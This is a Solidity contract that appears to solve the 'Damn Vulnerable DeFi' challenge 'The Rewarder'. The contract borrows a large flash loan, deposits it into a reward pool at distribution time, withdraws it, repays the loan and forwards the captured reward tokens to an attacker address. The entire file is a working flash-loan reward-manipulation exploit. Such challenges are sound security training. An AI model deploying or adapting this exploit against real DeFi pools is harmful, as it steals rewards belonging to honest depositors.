// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

/**
 * @title BigPlayer
 * @author Stealthyz

 */



 contract BigPlayer {
    FlashLoanerPool public immutable flashLoaner;

    TheRewarderPool public immutable rewarderPool;

    DamnValuableToken public immutable liquidityToken;

    RewardToken public immutable rewardToken;

    address payable public attacker;

    constructor(
        address _flashLoaner,
        address _rewarderPool,
        address _liquidityToken,
        address _rewardToken,
        address payable _attacker
    ) {
        flashLoaner = FlashLoanerPool(_flashLoaner);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        attacker = _attacker;
    }

    function receiveFlashLoan(uint256 amount) external {
        // We will deposit shit ton of DVT tokens into rewarderPool and receive accTokens
        // then distributeTokens to receive rewardTokens and
        // finally withdraw our liquiditytokens and return flashloan, simple as that!
        liquidityToken.approve(address(rewarderPool), amount);

        
        rewarderPool.deposit(1000000000000000000000000);
        rewarderPool.distributeRewards();
        

        rewarderPool.withdraw(amount);

        liquidityToken.transfer(address(flashLoaner), amount);

        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));

    } 

    function attack() external {
        flashLoaner.flashLoan(1000000000000000000000000);

    }


    receive() external payable {}
 }
